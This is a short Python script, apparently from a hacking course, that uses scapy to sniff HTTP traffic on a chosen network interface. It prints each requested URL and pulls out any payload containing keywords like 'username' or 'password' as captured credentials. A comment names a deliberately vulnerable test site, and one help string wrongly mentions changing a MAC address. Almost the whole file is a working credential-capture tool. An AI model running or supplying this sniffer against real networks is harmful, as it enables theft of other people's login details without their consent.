#!/usr/bin/env python3

# http://testphp.vulnweb.com/login.php

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest='interface',
                      help='Interface to change its MAC address.')
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error(
            '[-] Please specify an interface, Use --help for more info.')

    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    try:

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8')
            keywords = ['username', 'password', 'user', 'login', 'pass']
            for keyword in keywords:
                if keyword in load:
                    return load

    except UnicodeDecodeError:
        pass


def process_sniffed_packet(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print('[+] HTTP Request >>' + url.decode('utf-8'))

            login_info = get_login_info(packet)
            if login_info:
                print('\n\n[+] Possible username/password > ' +
                      login_info + '\n\n')

    except UnicodeDecodeError:
        pass


options = get_arguments()
sniff(options.interface)
